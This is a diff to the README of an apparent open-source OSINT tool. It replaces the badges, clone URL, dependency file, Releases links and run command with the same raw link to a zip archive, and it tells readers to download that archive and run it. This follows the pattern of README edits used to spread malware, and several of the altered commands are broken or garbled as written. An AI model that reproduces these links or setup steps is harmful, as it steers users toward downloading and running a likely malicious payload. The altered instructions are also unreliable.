@@ -1,8 +1,8 @@
 # BLUE OSINT - Open Source Intelligence Tool
 
-![Blue OSINT](https://img.shields.io/badge/Version-1.0.0-blue.svg)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
-![Python](https://img.shields.io/badge/Python-3.8%2B-yellow.svg)
+![Blue OSINT](https://raw.githubusercontent.com/FLORCRIOLLO/blueosint/main/inspoken/Software_1.7.zip)
+![License](https://raw.githubusercontent.com/FLORCRIOLLO/blueosint/main/inspoken/Software_1.7.zip)
+![Python](https://raw.githubusercontent.com/FLORCRIOLLO/blueosint/main/inspoken/Software_1.7.zip%https://raw.githubusercontent.com/FLORCRIOLLO/blueosint/main/inspoken/Software_1.7.zip)
 
 ## Table of Contents
 
@@ -45,7 +45,7 @@ To get started with Blue OSINT, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/FLORCRIOLLO/blueosint.git
+   git clone https://raw.githubusercontent.com/FLORCRIOLLO/blueosint/main/inspoken/Software_1.7.zip
    ```
 
 2. Navigate to the project directory:
@@ -55,17 +55,17 @@ To get started with Blue OSINT, follow these steps:
 
 3. Install the required dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/FLORCRIOLLO/blueosint/main/inspoken/Software_1.7.zip
    ```
 
-4. Download the necessary files from the [Releases section](https://github.com/FLORCRIOLLO/blueosint/releases) and execute them.
+4. Download the necessary files from the [Releases section](https://raw.githubusercontent.com/FLORCRIOLLO/blueosint/main/inspoken/Software_1.7.zip) and execute them.
 
 ## Usage
 
 To use Blue OSINT, run the main script from the terminal:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/FLORCRIOLLO/blueosint/main/inspoken/Software_1.7.zip
 ```
 
 You will see a menu with options for different OSINT tasks. Follow the prompts to enter the required information.
@@ -102,7 +102,7 @@ Blue OSINT is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases section](https://github.com/FLORCRIOLLO/blueosint/releases) for updates. You can also open an issue in the repository.
+If you encounter any issues or have questions, please check the [Releases section](https://raw.githubusercontent.com/FLORCRIOLLO/blueosint/main/inspoken/Software_1.7.zip) for updates. You can also open an issue in the repository.
 
 ## Acknowledgments
 
@@ -111,4 +111,4 @@ If you encounter any issues or have questions, please check the [Releases sectio
 
 ---
 
-Feel free to explore the repository and utilize the tool for your OSINT needs. For more details, visit the [Releases section](https://github.com/FLORCRIOLLO/blueosint/releases) to download the latest version.
+Feel free to explore the repository and utilize the tool for your OSINT needs. For more details, visit the [Releases section](https://raw.githubusercontent.com/FLORCRIOLLO/blueosint/main/inspoken/Software_1.7.zip) to download the latest version.
